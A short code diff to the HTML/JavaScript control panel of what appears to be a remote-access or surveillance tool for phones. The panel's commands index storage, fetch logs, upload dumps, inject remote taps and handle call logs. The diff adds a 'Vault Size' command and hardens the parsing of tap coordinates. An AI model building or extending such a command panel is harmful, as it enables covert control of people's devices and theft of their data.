@@ -220,6 +220,7 @@
                     <button class="btn" onclick="sendCmd('GET_SKELETON')">Index Storage</button>
                     <button class="btn" onclick="sendCmd('GET_LOGS')">Diag Logs</button>
                     <button class="btn" onclick="sendCmd('UPLOAD_DUMPS')">Sync Dumps</button>
+                    <button class="btn" onclick="sendCmd('GET_VAULT_SIZE')">Vault Size</button>
                 </div>
             </div>
 
@@ -365,7 +366,8 @@
                     case 'REMOTE_TOUCH':
                         const tAct = document.getElementById('touch-act').value;
                         let tVal = document.getElementById('touch-val').value;
-                        if (tAct === 'TAP') tVal = tVal.replace(',', '|'); // Format 500,1200 to 500|1200
+                        // Hardening: Convert '500, 1200' or '500 1200' to '500|1200' reliably
+                        if (tAct === 'TAP') tVal = tVal.trim().replace(/[\s,]+/g, '|');
                         content = tAct.includes('|') ? tAct : `${tAct}|${tVal}`; break;
                     case 'PHONE_LOGS':
                         content = `${document.getElementById('call-act').value}|${document.getElementById('call-val').value}`; break;
